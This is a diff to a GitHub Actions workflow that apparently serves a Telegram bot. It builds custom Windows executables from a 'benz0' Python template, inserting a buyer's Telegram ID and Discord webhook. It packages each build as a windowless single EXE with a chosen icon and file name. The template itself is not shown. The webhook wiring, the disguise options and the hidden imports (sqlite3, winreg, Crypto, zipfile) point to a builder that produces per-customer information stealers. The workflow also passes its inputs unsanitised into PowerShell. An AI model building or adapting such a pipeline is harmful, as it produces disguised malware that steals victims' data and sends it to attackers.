@@ -1,7 +1,7 @@
 name: Build EXE
 
 on:
-  workflow_dispatch:   # <-- ЭТО ОБЯЗАТЕЛЬНО
+  workflow_dispatch:
     inputs:
       user_id:
         description: 'Telegram User ID'
@@ -25,4 +25,107 @@ jobs:
   build:
     runs-on: windows-latest
     steps:
-      # ... остальные шаги
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.10'
+
+      - name: Install dependencies
+        run: |
+          pip install pyinstaller pycryptodome requests pillow
+
+      - name: Decode icon (if provided)
+        if: github.event.inputs.icon_base64 != ''
+        shell: pwsh
+        run: |
+          $bytes = [Convert]::FromBase64String("${{ github.event.inputs.icon_base64 }}")
+          [IO.File]::WriteAllBytes("temp_icon.png", $bytes)
+
+      - name: Convert icon to valid ICO (if provided)
+        if: github.event.inputs.icon_base64 != ''
+        run: |
+          python -c "
+import sys
+from PIL import Image
+try:
+    img = Image.open('temp_icon.png')
+    img.save('icon.ico', format='ICO', sizes=[(16,16),(32,32),(48,48),(64,64),(128,128),(256,256)])
+    print('✅ Icon converted to icon.ico')
+except Exception as e:
+    print(f'❌ Error converting icon: {e}', file=sys.stderr)
+    sys.exit(1)
+"
+
+      - name: Generate build script from template
+        shell: pwsh
+        run: |
+          $template = Get-Content "benz0_template.py" -Raw
+          # Replace USER_ID placeholder
+          $template = $template -replace 'USER_ID = "REPLACE_ME"', "USER_ID = `"${{ github.event.inputs.user_id }}`""
+          # Replace Discord webhook if provided
+          if ("${{ github.event.inputs.discord_webhook }}" -ne "") {
+            $template = $template -replace 'h00k = "https://discord.com/api/webhooks/..."', "h00k = `"${{ github.event.inputs.discord_webhook }}`""
+          }
+          # Determine output filename (use provided or default)
+          $filename = if ("${{ github.event.inputs.file_name }}" -ne "") { "${{ github.event.inputs.file_name }}" } else { "benz0" }
+          # Write the generated script
+          $template | Out-File -FilePath "${filename}.py" -Encoding utf8
+
+      - name: Build EXE with collect-all
+        run: |
+          $filename = if ("${{ github.event.inputs.file_name }}" -ne "") { "${{ github.event.inputs.file_name }}" } else { "benz0" }
+          $icon_arg = if (Test-Path "icon.ico") { "--icon=icon.ico" } else { "" }
+          pyinstaller --onefile --noconsole `
+            --collect-all=Crypto `
+            --collect-all=urllib3 `
+            --collect-all=requests `
+            --collect-all=urllib `
+            --hidden-import=sqlite3 `
+            --hidden-import=ctypes `
+            --hidden-import=winreg `
+            --hidden-import=threading `
+            --hidden-import=subprocess `
+            --hidden-import=datetime `
+            --hidden-import=time `
+            --hidden-import=random `
+            --hidden-import=re `
+            --hidden-import=os `
+            --hidden-import=sys `
+            --hidden-import=base64 `
+            --hidden-import=json `
+            --hidden-import=zipfile `
+            --hidden-import=shutil `
+            --hidden-import=urllib.request `
+            --hidden-import=urllib.parse `
+            --hidden-import=urllib.error `
+            --hidden-import=traceback `
+            --hidden-import=tempfile `
+            --hidden-import=glob `
+            --hidden-import=struct `
+            --hidden-import=socket `
+            --hidden-import=ssl `
+            --hidden-import=hashlib `
+            --hidden-import=hmac `
+            --hidden-import=http.client `
+            --hidden-import=io `
+            --hidden-import=binascii `
+            $icon_arg `
+            "${filename}.py"
+          # Rename EXE to exactly the desired name (file_name or default with user_id)
+          $exe_name = if ("${{ github.event.inputs.file_name }}" -ne "") { "${{ github.event.inputs.file_name }}.exe" } else { "benz0_${{ github.event.inputs.user_id }}.exe" }
+          if (Test-Path "dist\${filename}.exe") {
+            Rename-Item -Path "dist\${filename}.exe" -NewName $exe_name
+          } else {
+            Write-Error "EXE not found"
+            exit 1
+          }
+
+      - name: Upload EXE as artifact
+        uses: actions/upload-artifact@v4
+        with:
+          # Artifact name should match the expected pattern in bot (benz0_{user_id})
+          name: benz0_${{ github.event.inputs.user_id }}
+          path: dist/${{ github.event.inputs.file_name }}.exe
